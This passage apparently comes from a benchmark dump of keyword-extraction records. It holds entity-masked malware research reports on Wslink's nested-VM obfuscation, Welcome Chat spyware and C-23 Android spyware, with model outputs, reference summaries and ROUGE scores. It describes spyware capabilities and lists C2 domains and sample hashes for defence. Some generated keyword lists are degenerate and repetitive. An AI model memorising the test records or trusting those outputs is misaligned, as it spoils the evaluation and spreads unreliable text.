, which is not complicated The question is : What do we do with the [ORDINAL] second VM?There is a pretty simple solution \u2013 instead of preserving the entire context of the [ORDINAL] second VM and working with both at once , we can simply concretize the entire [ORDINAL] second VM as we know what memory ranges belong to the [ORG] VMsWe will also ignore all memory assignments to the [ORDINAL] second VM \u2019s context and not preserve any information about its structure This will enable us to focus only on the [ORDINAL] first one and build the same graph as beforeWe could also preserve the obfuscated IR of all the virtual instructions of the [ORDINAL] first VM and use them instead \u2013 it would save a significant amount of time during the processing since we would not repeatedly disassemble , translate and deobfuscate the [ORDINAL] second VM for each opcode in the bytecode blocks of the [ORDINAL] first VM However , we want to show that it is possible to process both layers at once40Processing the initial bytecode block We processed the very [ORDINAL] first bytecode block as was described in the previous section The resulting code still appears to be too complex since we expected a series of POPs , the deobfuscated code and then a series of PUSHes and finally mapping back to the native registers However , there are additional , multiple branches One can see part of the code in Figure 38Figure [CARDINAL] 38 The [ORDINAL] first processed bytecode block41Opaque predicates Looking at the code more closely , we notice [CARDINAL] two types of expressions that can be further simplified The [ORDINAL] first is the value of RBP_init , which is the address of the virtual context and it is known ( Figure [CARDINAL] 39)Figure 39 Expressions that can be further simplifiedBoth paths that follow the initial block in Figure [CARDINAL] 39 contain the same code , hence this is not the same case as with the [ORG] POP virtual instruction , where it was important to know what the target register was because it determined the subsequent behavior of the virtual instruction These checks are , on the other hand , unimportant and we can just get rid of them \u2013 they can be considered as a sort of opaque predicateNote that the branch of the [ORG] POP virtual instruction was now optimized out automatically since offsets of the registers were present in the bytecode and directly knownFinally , these were the last obfuscation techniques , and we can look at the simplified codeOverview We are finally greeted with a familiar , even pleasant , view in Figure [CARDINAL] 40 \u2013 as expected the code begins with a series of POPs ( red ) and ends with a series of PUSHes ( green ) that represent parts of the context switchesAnother interesting detail is that the VM uses a special internal register to store the destination address \u2013 the final jump is not visible , but the code jumps to @64[RBP_init + 0x133 ] As was mentioned earlier , the VM also stores the base address of its code section ; this is stored in virtual register @64[RBP _ init + 0x80 ] in our caseOne can see that the code in Figure [CARDINAL] 40 also accesses certain data using the base address , specifically at offset [CARDINAL] 0x0E3808 ( blue ) After looking up the address , we found that it belongs to a [ORG] ServiceStatus structure ( Figure 41)42Figure 40 Code of the processed bytecodeFigure [CARDINAL] 41 Data accessed by the code \u2013 ServiceStatus43It additionally sets a register before recovering the native state to a data address at offset [CARDINAL] 0x2FB0 ( yellow ) The address contains a non - obfuscated function shown in Figure [CARDINAL] 42Figure [CARDINAL] 42 Function whose pointer is used in the codeLet us now focus on the destination address ( gray ) \u2013 it is set to < base address > + 0x8C038 Looking up that address in the sample , we see it belongs to the Windows API RegisterServiceCtrlHandlerW , which makes sense as the application is a service ( Figure [CARDINAL] 43)Figure 43 Destination address of the bytecodeThe question is now , what is the return address of the API call When we look at the end of the code , we see that it sets the return address \u2013 the highlighted assignment in Figure [CARDINAL] 44 appears to be 0x88 bytes above the stack pointer , but we need to keep in mind that we started below the stack pointer because we did not perform the initial context pushing from [ORG] vm_init ( ) and in reality , it is the return addressThe return address is set to another vm_pre_init()Figure [CARDINAL] 44 Setting return address of the API callThe last part of the code that needs to be analyzed is the body of the loop ( Figure [CARDINAL] 45 ) It is pretty simple \u2013 it zeroes out a memory range If we look back at Figure [CARDINAL] 40 and look up what is in @64[RBP_init + 0x74 ] , we see that it is set to the address of the [ORG] ServiceStatus structure ( blue ) \u2013 this piece of code zeroes out the structure Meanwhile , @64[RBP_init + 0x4F ] ( pink in Figure [CARDINAL] 40 ) initially contains the constant 0x1C \u2013 size of the structure \u2013 and @64[RBP_init + 0xCC ] , the CPU flags44Figure 45 Body of the code \u2019s loopNow we look at the discovered non - obfuscated sample and compare it against our findings We can confirm that we deobfuscated the [ORDINAL] first bytecode block successfully ( Figure [CARDINAL] 46)Figure 46 The same part of code in the non - obfuscated binaryStatistics in [LAW] Table [LAW] 7 have been extracted from the processing of the [ORDINAL] first bytecode blockSize of the bytecode block in bytesTotal number of processed virtual instructions69562Total number of underlying native instructions3,536,427Total number of resulting [ORG] IR instructions ( including IRDsts)192Execution time in seconds382 5678Table 7 Statistics of the [ORDINAL] first processed bytecode block45DESCRIPTION OF OUR FINAL VM ANALYZER CODE Our final analyzer code consists of several classes that interact together , as described in the following sections The full code listing is available in our [ORG] GitHub repository The classes follow the high - level descriptions from the previous Automating analysis sectionsClass [ORG] Wslink [ORG] Wslink is a mediator that handles interaction of the remaining classes , its constructor processes the supplied memory dump , and its method process ( ) accepts the value of the virtual program counter \u2013 pointer to the bytecode \u2013 with the opcode of the initial instruction The bytecode is subsequently processed using classes [ORG] VirtualContext , SymbolicCFG and [ORG] MySymbolicExecutionEngine ; the resulting control flow graph is written into a [ORG] DOT file vma.dot . Parts of the VM , such as address of the instruction table or offsets of the virtual registers for obfuscation , should be overwritten to provide specific values for individual VMsClass VirtualContext This class represents the virtual context \u2013 it contains most notably the initial values of the virtual registers for obfuscation , virtual program counter , and the address of the instruction tableIt also provides several methods for working with the context described in the following sectionsMethod get_next_instr ( ) The method get_next_instr ( ) applies the address of the instruction table to the destination address to simplify the corresponding expression and attempts to unambiguously determine the address of the next virtual instruction to be executedMethod get_irb_symbs ( ) This method simply acquires the expressions that should be preserved in the nodes of the resulting control flow graphMethod get_updated_internal_context ( ) The method [PERSON] get_updated_internal_context ( ) updates values of the internal registers that need to be preserved between virtual instructions , such as the virtual program counter or the obfuscation registersMethod get_state_hash ( ) This method calculates a hash for virtual instructions \u2013 the hash is used to specify the actual position in the bytecode to reconstruct the control flow graph without duplicate nodes or paths and to avoid infinite loops in cycles It is calculated just from the virtual program counterClass [ORG] MySymbolicExecutionEngine This class overrides the method mem_read ( ) of [ORG] Miasm [ORG] \u2019s class [NORP] SymbolicExecutionEngine primarily to transform memory accesses relative to the virtual program counter and the virtual instruction table into concrete values It is additionally meant to make the [ORDINAL] second VM completely concrete when we are processing the [ORDINAL] first one46Class SymbolicCFG This class is meant to construct the resulting control flow graph It uses class [ORG] Node to process individual virtual instructions , to acquire the expressions that need to be preserved , and to determine addresses of the next virtual instructionsEach [ORG] Node is tied to a hash generated by get_state_hash ( ) ( as described above ) and the address , StateID , of the block of code that is being processed This means that virtual instructions containing unbounded loops can not currently be processed correctly because when we connect a state to an already processed one , it will not take into account the changes introduced in the body of the loopClass Node This class simply represents a node in the resulting control flow graph \u2013 it most notably contains the values of the obfuscation registers and virtual program counter that are together called init_symbols These are the values required to determine the addresses of the next virtual instructionsIt provides a method process_addr ( ) that can get the following [GPE] Nodes classes that have not yet been processed and return them along with the expressions that should be preserved in a data - class ContextResultThe new [GPE] Nodes are created based on the supplied addresses using method _ [PERSON] get_next ( ) , which accepts several arguments The arguments can instruct the function to slightly modify the resulting [ORG] Node \u2013 make a copy of the actual symbolic state when there is a branch , or update init_symbols for a new virtual instructionFUTURE WORK Once we discovered a non - obfuscated sample , we were not motivated to completely deobfuscate the rest of the codeOur next steps would consist of:1 . Getting rid of the intro and outro and mapping the virtual registers directly to the native ones [CARDINAL] 2 . Automatically processing the subsequent bytecode blocks and extending the graph with resulting codelistings to get an overview of the whole function3 . Optionally addressing individual instructions with unbounded loops that can not be fully processed usingsymbolic execution ( e g , instructions like DEC_RC4 mentioned in [ORG] Miasm [ORG] \u2019s blog ) and manually creating their [ORG] IR to be added to the graph We could also experiment with some enhancements of symbolic execution that attempt to mitigate the issue4 . Optionally matching resulting [ORG] IR expressions against known [ORG] IR expressions of assembly instructions torecover assembly code47CONCLUSION We have described internals of an advanced multilayered virtual machine featured in [GPE] Wslink and successfully designed and implemented a semiautomatic solution capable of significantly facilitating analysis of the program \u2019s code This virtual machine introduced several other obfuscation techniques such as junk code , encoding of virtual operands , duplication of virtual opcodes , opaque predicates , merging of virtual instructions and a nested virtual machine to further obstruct reverse engineering of the code that it protects , yet we successfully overcame them allTo deal with the obfuscation we modified a known technique that extracts the semantics of the virtual opcodes using symbolic execution with simplifying rules Additionally , we made concrete the internal virtual registers for obfuscation along with memory accesses relative to the virtual program counter to automatically apply known values and deobfuscate semantics of the virtual instructions \u2013 this additionally broke down boundaries between individual virtual instructions [NORP] Boundaries are necessary to prevent path explosion of the symbolic execution ; we would lose track of the virtual program counter \u2013 our position in the interpreted code \u2013 without themWe defined new boundaries by symbolizing the address of the virtual instruction table , since it is required to get the next instruction , and concretized it only when we needed to move to the following virtual instructions We subsequently constructed a control flow graph of the original code in an intermediate representation from [CARDINAL] one of the bytecode blocks based on the virtual program counter , and extracted deobfuscated semantics of individual virtual instructions We finally extended the approach to process both virtual machines at once by entirely concretizing the nested [CARDINAL] one", "generated_text": "PDF; techniques; deobfuscation; virtual machines; Wslink; Miasm; VMI; the VM; initialization; vm_entry; junk code; the second virtual machine; a bytecode block; the VM; the initial bytecode block; the second virtual instruction; the third virtual instruction; the fourth virtual instruction; an overview; IR semantics; the first virtual instruction; the second virtual instruction; the first bytecode block; the IDA; the decompiler; a part; the same block; the dev; MySymbolicExecutionEngine; a block; IDA; the vm_pre_init; a vm_pre_load; a vm_replacement; a block; a vm_unload; a vm_replacement; a vm_replacement; the vm_replacement; a vm_replacement; a vm_replacement; a vm_replacement; a vm_replacement", "ref_text": "<START-1>The document analyzes the structure of the virtual machine used to obfuscate malware samples of Wslink, a unique and previously undocumented malicious loader. Wslink's virtual machine uses multiple layers of obfuscation techniques to hinder analysis and detection. The document provides an overview of virtual machine structures in general, including system VMs that support full operating systems, and process VMs that execute individual programs. It describes the bytecode, interpreter, context switching, and dispatch techniques used in process VMs. It then analyzes the specific techniques used in Wslink's VM: The VM is packed with NsPack and contains junk code obfuscation. The VM has two layers - a first VM with around 45 opcodes that executes a second VM with over 1000 opcodes. The second VM initializes itself similarly to common VMs, with context switching from native to virtual registers. The first VM exhibits more complex obfuscation like encrypted operands, opaque predicates, and merged instructions. The document shows how to analyze the VMs using symbolic execution to simplify obfuscated code, concretize known values like internal registers, and reconstruct control flow graphs. Analysis revealed the VM calls Windows API functions to register as a service, zeroes out a status structure, and returns to a VM entry point. The techniques allowed semiautomated deobfuscation of one bytecode block, confirmed against a non-obfuscated sample. Future work could fully process all bytecode blocks to deobfuscate the full malicious code. In summary, the document provides an in-depth analysis of Wslink's advanced obfuscation techniques and demonstrates methods to overcome them. It shows how to peel away layered obfuscation to reveal the underlying malicious payload. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.23824451410658307, "gpt3/lexical/rouge_rouge2": 0.10094637223974764, "gpt3/lexical/rouge_rougeL": 0.13166144200626959, "gpt3/lexical/rouge_rougeLsum": 0.13166144200626959, "gpt3_generated_text": ["This article provides an in-depth analysis of the Wslink virtual machine and explores various techniques for deobfuscation. The article begins with an overview of the general structure of virtual machines and documented techniques for deobfuscation. It then introduces the Miasm framework, which is used for analyzing the Wslink virtual machine."]}, {"split_name": "test", "sample_id": "test_122", "prompt_text": "Extract the keywords: [CARDINAL] 7/16/2020Welcome Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityWelcome Chat as a secure messaging app ? Nothing could be further from the [DATE] truthwelivesecurity.com/2020/07/14/welcome-chat-secure-messaging-app-nothing-further-truthJuly [DATE] 14 , 2020We discovered a new operation within a long - running cyber - espionage campaign in [LOC] the [LOC] Middle [LOC] East . [PERSON] Targeting [PERSON] Android users via the malicious Welcome Chat app , the operation appears to have links to the malware named [ORG] BadPatch , which MITRE links to the Gaza Hackers threat actor group known also as Molerats . Our analysis shows that the Welcome Chat app allows spying upon its victims . However , it is not simple spyware . Welcome Chat is a functioning chat app that delivers the promised functionality along with its hidden espionage capacity . We found this spyware being advertised to chat - hungry users ( these apps are banned in some countries in [LOC] the [LOC] Middle [LOC] East region ) on a dedicated website ( see Figure [CARDINAL] 1 ) . The fact that the website is in [NORP] Arabic conforms with the targeting of the whole campaign we believe this operation belongs to . The domain was registered in [DATE] October [DATE] 2019 ; we could n\u2019t , however , determine when the website was launched . Figure [CARDINAL] 1 . The website of the malicious Welcome Chat appurl [PERSON] Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityThe malicious website promotes the Welcome Chat app , claiming it \u2019s a secure chat platform that is available on the Google Play store . Both claims are false . In regard to the \u201c secure \u201d claim , nothing is further from the truth . Not only is Welcome Chat an espionage tool ; on top of that , its operators left the data harvested from their victims freely available on the internet . And the app was never available on the official [ORG] Android app store . Figure [CARDINAL] 2 . Despite the caption stating \u201c High quality , secure and available on Google Play \u201d , the buttonleads to the installation file being downloaded directly from the malicious websiteFunctionality / AnalysisOnce the user downloads the app , it needs the setting \u201c Allow installing apps from unknown sources \u201d to be activated since the app was not downloaded from [PERSON] the [PERSON] Play [PERSON] Store . After installation , the malicious app will request the victim to allow permissions such as send and view SMS messages , access files , record audio , and access contacts and device location . Such an extensive list of intrusive permissions might normally make the victims suspicious \u2013 but with a messaging app , it \u2019s natural they are needed for the app to deliver the promised functionality.url Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityFigure [CARDINAL] 3 . Permission requests by Welcome Chat spywareIn order to be able to communicate with other users of this app , the user needs to register and create a personal account ( see Figure 4).url Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityFigure 4 . The Sign up / Login dialog of the Welcome Chat appImmediately after receiving these permissions , Welcome Chat sends information about the device to its [ORG] C&C and is ready to receive commands . It is designed to contact the [ORG] C&C server [TIME] every [TIME] five [TIME] minutes . On top of its core espionage functionality \u2013 monitoring the chat communications of its users \u2013 the Welcome Chat app can perform the following malicious actions : exfiltrating sent and received SMS messages , call log history , contact list , user photos , recorded phone calls , the GPS location of the device , and device info . Trojanized or attacker - developed chat app?url Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityAn interesting question arises with functional trojan apps : is the app an attacker- trojanized version of a clean app , or did the attackers develop a malicious app from scratch?In both cases , it is easy for the attackers to spy on exchanged in - app messages as they would \u2013 naturally \u2013 have the authorization keys to the user database . Despite the [ORDINAL] first option being typical for trojanized apps , we believe that in this particular case , the [ORDINAL] second explanation is more probable . Typically , trojanized apps are created via a process of appending the malicious functionality to a legitimate app . The bad guys find and download a suitable app . After decompiling it , they add the malicious functionality and recompile [DATE] the now - malicious- yet - still - functioning app to spread it among their desired audience . There is a major question mark with this option : to [DATE] this [DATE] day , we have not been able to discover any clean version of the Welcome Chat app . Not only can it not be found on any of the [ORG] Android markets we have on our radar ; based on the binary matching algorithms in our sample classification systems , we have n\u2019t found any clean app with this same chat functionality . Of interest in this regard is that a clean version of Welcome Chat , without the espionage functionality , was uploaded to [ORG] VirusTotal in mid - February [DATE] 2020 ( hash : submitted to [ORG] VirusTotal [DATE] a [DATE] week [DATE] earlier . This leads us to believe that the attackers developed the malicious chat app on their own . Creating a chat app for [ORG] Android is not difficult ; there are many detailed tutorials on the internet . With this approach , the attackers have better control over the compatibility of the app \u2019s malicious functionality with its legitimate functions , so they can ensure that the chat app will work . Code analysisThe Welcome Chat espionage app seems to have targeted [LANGUAGE] Arabic - speaking users : both the default website language and default in - app language are [LANGUAGE] Arabic . However , based on debug logs left in the code , strings , class and unique variable names , we were able to determine that most of the malicious code was copied from publicly available open source code projects and code example snippets available on public forums.url Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityFigure 5 . The developer used different pieces of open source code to create the malicious appIn some cases , the copied open source code is quite old \u2013 see [LAW] Table [LAW] 1 . As a possible explanation , all the listed examples come at the very top among the results of simple googling for the respective functionalities.url Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityTable [CARDINAL] 1 . The origins of the malicious codeFunctionalitySourceAge ( years)Call recordingSMS stealingopen source , [ORG] GitHubopen source , GitHub86Google Maps coordinates open source , [PERSON] Blogspot ( plus other sources ) 5GEO trackingGPS trackingUser data leakopen source , [ORG] GitHubopen source , GitHub85The Welcome Chat app , including its infrastructure , was not built with security in mind . The app uploads all of the user \u2019s stolen data to the attacker - controlled server via unsecured HTTP.Transmitted data is not encrypted and because of that , not only it is available to the attacker , it is freely accessible to anyone on the same network . The database contains data such as name , email , phone number , device token , profile picture , messages and friends list \u2013 in fact , all the users \u2019 data except for the account passwords can be found uploaded to the unsecured server . Figure [CARDINAL] 6 . The victim \u2019s device uploads the user data to the app \u2019s serverurl [PERSON] Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityFigure 7 . User database leakFigure [CARDINAL] 8 . Leaked user infoFigure [CARDINAL] 9 . An example of an in - app message being freely accessible on the app \u2019s unsecured serverOnce we discovered the sensitive information as being publicly accessible , we intensified our efforts to discover the developer of the legitimate chat app ( i.e. , the app the espionage tool was \u2013 eventually \u2013 a trojanized version of ) to disclose the vulnerability to them . Weurl Chat as a secure messaging app ? Nothing could be further from the truth | WeLiveSecurityfound neither the developer nor the app , convincing us that the app was built from the beginning as malicious . Naturally , we made no effort to reach out to the malicious actors behind the app . Possible BadPatch connectionThe Welcome Chat espionage app belongs to the very same [ORG] Android malware family that we identified at [DATE] the [DATE] beginning [DATE] of [DATE] 2018 . That malware used the same [ORG] C&C server , pal4u.net , as the espionage campaign targeting [LOC] the [LOC] Middle [LOC] East that was identified in [DATE] late [DATE] 2017 by [ORG] Palo [ORG] Alto [ORG] Networks and named [ORG] BadPatch . In [DATE] late [DATE] 2019 , [PERSON] Fortinet described yet another espionage operation focused on [NORP] Palestinian targets with the domain pal4u.net among its indicators of compromise . For these reasons we believe that this campaign with new [ORG] Android trojans comes from the threat actors behind the long - term [ORG] BadPatch campaign . RecommendationWhile the Welcome Chat - based espionage operation seems to be narrowly targeted , we strongly recommend that users do n\u2019t install any apps from outside the official Google Play store \u2013 unless it \u2019s a trusted source such as a website of an established security vendor or some reputable financial institution . On top of that , users should pay attention to what permissions their apps require and be suspicious of any apps that require permissions beyond their functionality \u2013 and , as a very basic security measure , run a reputable security app on their mobile devices . Indicators of Compromise ( IoCs)HashESET detection nameC60D7134B05B34AF08023155EAB3B38CEDE4BCCDAndroid / Spy . Agent . ALYC755D37D6692C650692F4C637AE83EF6BB9577FCAndroid / Spy . Agent . ALY89AB73D4AAF41CBCDBD0C8C7D6D85D21D93ED199 [ORG] Android / Spy . Agent . ALY2905F2F60D57FBF13D25828EF635CA1CCE81E757Android / Spy . Agent . ALYC&C : emobileservices.clubMITRE ATT&CK techniquesTacticIDNameDescriptionurl Chat as a secure messaging app ? Nothing could be further from the truth | [FAC] WeLiveSecurityTacticIDNameDescriptionT1444 [FAC] Masqueradeas Legiti- mate [PRODUCT] ApplicationWelcome [PRODUCT] Chat impersonates a legitimate chat application . T1402 App Auto- Start at De- vice BootWelcome [PERSON] Chat listens for the BOOT_COMPLETED broadcast , ensuring that the app 's functionality will be activated every time the device starts . Initial tionT1426 System In- TrackingT1433 Access CallLogT1432 Access Con - tact ListT1429 [ORG] CaptureAudioT1533 [ORG] Data fromLocal SystemWelcome Chat collects information about the device . Welcome Chat exfiltrates sent and received SMS messages . Welcome Chat spies on the device 's location . Welcome Chat exfiltrates call log history . Welcome Chat exfiltrates the user contact list . Welcome Chat records surrounding audio . Welcome Chat steals user photos stored on device . Welcome Chat uploads exfiltrated data using the HTTP protocol . Com- [CARDINAL] 14 Jul 2020 - 11:30AMNewsletterurl", "generated_text": "the link; the Welcome Chat app; the malware; BadPatch; the Middle East; the app; permissions; SMS messages; call log history; contact list; video; photos; contacts; location; the device; the attacker; access; contacts; data; the app; the C&C server; the user; the group; Molerats; users; the campaign; malware; the app; attacks; targets.", "ref_text": "<START-1>The PDF describes a new cyberespionage operation targeting Android users in the Middle East region. Researchers discovered a spyware app called Welcome Chat being promoted as a secure messaging app, but it actually steals extensive data from victims. Welcome Chat was distributed outside the Google Play store via a website in Arabic. It requests intrusive permissions needed for it to function as a chat app. But it also covertly exfiltrates SMS messages, call logs, contacts, photos, recordings, location, and other data to its command and control server. Analysis indicates Welcome Chat was likely built fully malicious, not by trojanizing a legitimate chat app. Its code was copied from various open source projects. Collected data was found freely available on an unsecured server. Links were found between Welcome Chat and a years-long espionage campaign in the Middle East called BadPatch, tied to the threat actor Molerats/Gaza Hackers. The spyware used the same command and control infrastructure. The report concludes users should avoid sideloading apps from outside official app stores to avoid this type of spyware. Technical details like hashes and ATT&CK techniques are provided to detect Welcome Chat. Users should be wary of chat apps requesting excessive permissions. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5531914893617023, "gpt3/lexical/rouge_rouge2": 0.20855614973262035, "gpt3/lexical/rouge_rougeL": 0.28191489361702127, "gpt3/lexical/rouge_rougeLsum": 0.28191489361702127, "gpt3_generated_text": ["A new cyber-espionage campaign in the Middle East has been discovered, targeting Android users through the Welcome Chat app. The operation is linked to the malware named BadPatch and the threat actor group Molerats. The Welcome Chat app, despite being advertised as a secure messaging platform, is actually a functioning chat app with hidden espionage capabilities. The app requests extensive permissions upon installation, allowing it to spy on its users' SMS messages, call log history, contact list, photos, recorded phone calls, GPS location, and device information. The app also sends data to a command and control server every five minutes. It is unclear whether the app is a trojanized version of a clean app or if the attackers developed it from scratch, but no clean version of the app has been found. The malicious Welcome Chat app was never available on the official Android app store, and the data harvested from victims was left freely available on the internet. This operation is believed to belong to a larger campaign targeting users in the Middle East."]}, {"split_name": "test", "sample_id": "test_123", "prompt_text": "Extract the keywords: Android [ORG] APT spyware , targeting [LOC] Middle [LOC] East victims , enhances [ORG] evasivenessnews.sophos.com/en-us/2021/11/23/android-apt-spyware-targeting-middle-east-victims-improves-its-capabilities/Pankaj [DATE] KohliNovember [DATE] 23 , 2021Newly - discovered variants of an [ORG] Android spyware that previously was attributed to an advanced persistent threat actor group called [PRODUCT] C-23 ( also known as [ORG] GnatSpy , [ORG] FrozenCell , or VAMP ) have incorporated new features into their malicious apps that make them more resilient to actions by users , who might try to remove them manually , and to security and web hosting companies that attempt to block access to , or shut down , their command- and - control server domains . The [PRODUCT] C-23 threat actor has , in the past , targeted individuals based in [LOC] the [LOC] Middle [LOC] East , particularly in [GPE] the [GPE] Palestinian [GPE] Territories . The group has been active since at least 2017.1/13The spyware app initially disguises itself as something called \u201c [ORG] App Updates\u201dThe new variants appear in the form of an app that purports to install updates on the target \u2019s phone , with names that include [ORG] App [ORG] Updates , [PERSON] System [PERSON] Apps [PERSON] Updates , or [ORG] Android [ORG] Update [ORG] Intelligence . Sophos suspects that the apps are delivered to specific users by means of SMS text messages linking to downloads . To the best of our knowledge , none of the apps have been hosted on Google Play Store , though Sophos did reach out to the [ORG] Android security team and sent details about the apps to the company . Once installed , the spyware sends unique , identifiable device parameters to its command - and - control server . [CARDINAL] One of the newer features of this variant is that it will , initially , use a hardcoded C2 address to communicate , but also contains code that allows the operators of the spyware to push down a new address . This ability can keep the malware functional if [CARDINAL] one or more of the [CARDINAL] C2 server domains is taken down . The new variants did not conceal or obfuscate the [CARDINAL] C2 server address in any way.2/13Code that can modify the [CARDINAL] C2 domain on a running installation is a notable new featureMany of the new variants were found to have been digitally signed by a certificate ( with associated with malware for [DATE] years . Changing disguises after installationThe [ORDINAL] first time the user opens the app , it requests that the user grant the app specific permissions to do the kinds of things you \u2019d expect spyware to do : It requests permissions to record ambient audio , and to access all files stored on the device . But the apps also use a bit of social engineering to ask the user to grant advanced permissions : notification access , device administrator , and the ability to observe the user \u2019s actions while interacting with apps.3/13The app \u2019s requests appear to justify the need for the additional features , but they \u2019re lies . For instance , the request to \u201c [WORK_OF_ART] Enable [WORK_OF_ART] Notifications \u201d claims that the app needs this functionality or else \u201c you wo n\u2019t receive notifications in real time . \u201dBut that is n\u2019t what [PRODUCT] Notification [PRODUCT] Access permissions do . When prompted to enable this feature , the app pushes the user to a system permissions window that accurately describes what the permission does . The threat actors may assume that the target wo n\u2019t carefully read , or understand , the consequences of clicking Allow on this screen.4/13This permission grants the spyware the ability to read the full - text messages and the names of contacts , from any app , such as Facebook or [ORG] WhatsApp , as well as dismissing notifications from other apps ( such as a mobile anti - malware app \u2019s warnings ) or toggling the Do Not [PERSON] Disturb settings on the phone . The device administrator permission gives the operator of the app the ability to lock the phone , but according to our analysis , the spyware \u2019s current version has no capability to do this . The app prompts the user to Enable the device admin permission or \u201c system wo n\u2019t secure your internet connection . \u201d5/13In reality , the feature the spyware wants the user to enable would let the spyware lock the phone . The final prompt asks the user to change a setting with a vague warning about something being blocked as a result of battery optimization.6/13Like the other prompts , this is also bogus . This prompt redirects the user to enable a feature that permits the spyware to identify what apps you use , when you \u2019re using them . The spyware sends that information onward to its [CARDINAL] C2 server.7/13Once the target has granted all these permissions , the app disguises itself to evade any attempts at manual removal by the user . The method to attain stealth appears to be new to this version : the spyware changes its icon ( and name ) to disguise itself using an icon of [CARDINAL] one of the [CARDINAL] four apps : or Botim ( a VOIP calling app).Once this happens , the next time the spyware app is opened , the spyware opens the real app whose disguise it wears , i.e. , it opens [FAC] Chrome if it disguises itself as [ORG] Chrome , thereby giving an illusion to the user that the app is legit.8/13The spyware app icon appears as \u201c [WORK_OF_ART] App [WORK_OF_ART] Updates \u201d before the change \u2026 [CARDINAL] 9/13 \u2026 and afterward takes on the icon of the [FAC] Chrome browser , and launches thatapp when the user clicks the icon . The apps contain a text string , in the [LANGUAGE] Arabic language , that they send to the command and control server when the icon has been changed . These strings are present in these new versions of the malware.\ufe94\ufee7\ufeee\ufed8\ufbfe\ufef7\u0627 \ufeae\ufbff\ufbff\ufed0\ufe97 [PERSON] \ufee2\ufe97We also found that it tried to install its own version of Botim from the application \u2019s assets \u2013 a functionality we believe was meant for future versions , as the samples did not contain ( or try to download ) any [PERSON] Botim [PERSON] APK file . Each functionality of the spyware has a command associated with it . The commands are received via [ORG] Firebase messaging , and the spyware performs the corresponding function as and when instructed.10/13The live C2 servers posed as websites for [ORG] Laravel \u2013 a web application framework.11/13C2 website posed as website for [ORG] Laravel ( a web application framework)Yet many of the functionalities of the spyware remain unchanged . The app does the following things : Collects SMS , contacts , call logs Collects images and documents Recording audio , incoming and outgoing calls , including [ORG] WhatsApp calls Taking screenshots and recording video of the screen Taking pictures using the camera Hiding its own icon Reading notifications from [ORG] WhatsApp , Facebook , [PERSON] Facebook [PERSON] Messenger , [ORG] Telegram , Skype , [PERSON] IMO [PERSON] Messenger , or [ORG] Signal [ORG] Canceling notifications from built - in security apps ( such as [ORG] Samsung [ORG] SecurityLogAgent , [PERSON] Xiaomi [PERSON] MIUI [PERSON] SecurityCenter , [PERSON] Huawei [PERSON] SystemManager ) , as well as from [ORG] Android system apps , package [ORG] Installer , and its own notificationsInternal logging shows the app writing out the contents of the contact list , call logs , and SMSmessages to a [PERSON] Zip archive it later uploads to its [GPE] C2Don\u2019t be a spyware victim12/13To avoid falling prey to such malicious apps , users should only install apps from trusted sources such as Google Play . Updating Android OS and applications should be done via [ORG] Android [ORG] Settings and Google Play respectively , instead of relying on a [ORDINAL] third - party app . Users should be particularly wary of apps asking for sensitive permissions such as device admin , notification access , or those requiring superuser / root access . Users can view the apps currently having device admin and notification access permissions by browsing to Settings and searching for \u201c Device admin apps \u201d and \u201c Notification access \u201d respectively . Detections and acknowledgmentsWe also advise users to consider installing an antivirus app on their mobile device such as Sophos Intercept X for [GPE] Mobile that defends their device and data from such threats . [ORG] SophosLabs has published indicators of compromise on its [PERSON] Github page . These samples are detected by [ORG] Sophos [ORG] Intercept [ORG] X [ORG] for [GPE] Mobile as Andr / Spy - BFI.SophosLabs would like to acknowledge that @malwrhunterteam initially alerted us to some of the samples in this post . [PERSON] Andrew [PERSON] Brandt conducted additional research for this article.13/13", "generated_text": "the App Updates; Android; C-23; GnatSpy; FrozenCell; VAMP; the app; SMS text messages; downloads; the spyware; the user; commands; files; the device; the IP address; code; the C2 address; the malware; social engineering; the user; the ability; Notification Access; notification access; the user; screen; the capabilities; the app; time; contacts; WhatsApp; the user; the entity; their domain; the C2 server; APK; the target; Palestinian Territories; the attackers; the malware.", "ref_text": "<START-1>The document describes newly discovered variants of an Android spyware called Andr/Spy-BFI. This spyware has previously been attributed to an advanced persistent threat (APT) group known as C-23 or FrozenCell that targets individuals in the Middle East. The new variants appear as apps named \"App Updates\", \"System Apps Updates\", or \"Android Update Intelligence\". They likely spread via SMS links and have not been hosted on the Google Play store. The spyware requests extensive permissions from users under false pretenses, including notification access to read messages/contacts, device admin privileges, and usage tracking. After permissions are granted, it disguises itself as a legitimate app like Chrome to avoid manual removal. The malware exfiltrates extensive data from the device including messages, contacts, audio recordings, screenshots, camera images, and logs of app usage. It communicates with command and control servers posing as Laravel web frameworks. New capabilities in these variants include modifying the C2 domain if others are taken down, using signed certificates associated with past malware, and changing icon/name for stealth. The core spyware functionality of stealing data and communicating with C2 remains the same. Sophos recommends only installing apps from trusted sources, being wary of sensitive permission requests, and using mobile antivirus to detect such threats. Technical details and indicators of compromise are provided for defenders. In summary, these are enhanced variants of the Andr/Spy-BFI Android spyware used by the C-23 APT group and targeting Middle Eastern victims with more evasive capabilities. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.49635036496350365, "gpt3/lexical/rouge_rouge2": 0.17114914425427874, "gpt3/lexical/rouge_rougeL": 0.2773722627737226, "gpt3/lexical/rouge_rougeLsum": 0.2773722627737226, "gpt3_generated_text": ["The article discusses newly discovered variants of an Android spyware attributed to the C-23 threat actor group, also known as GnatSpy, FrozenCell, or VAMP, targeting individuals in the Middle East, particularly in the Palestinian Territories. The spyware disguises itself as \"App Updates\" and is delivered to specific users via SMS text messages. Once installed, the spyware sends device parameters to its command-and-control server and can modify the C2 domain on a running installation. The app requests permissions to access files, record audio, and observe user actions, using social engineering to deceive the user into granting advanced permissions. After obtaining these permissions, the app disguises itself to evade manual removal by the user. The spyware also has the capability to read full-text messages, access contacts, and gather information about the user's app usage, which is sent to its C2 server. This new variant of the spyware enhances its evasiveness and resilience, making it more difficult to detect and 